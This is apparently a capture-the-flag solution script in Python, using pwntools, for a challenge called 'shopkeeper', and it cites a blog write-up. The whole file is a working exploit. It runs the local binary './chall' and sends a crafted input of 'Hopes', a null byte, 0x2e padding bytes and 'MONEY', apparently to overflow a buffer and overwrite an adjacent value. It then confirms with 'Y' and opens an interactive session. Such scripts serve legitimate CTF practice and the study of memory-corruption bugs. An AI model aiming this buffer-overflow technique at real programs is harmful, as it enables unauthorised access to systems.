# https://blog.y2a.dev/articles/2022/05-05/shopkeeper/
from pwn import *

file = "./chall"
e = ELF(file)
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

io = process(file)
io.sendlineafter("> ", b"Hopes\x00"+b"A"*0x2e+b"MONEY")
io.sendlineafter("> ", "Y")

io.interactive()
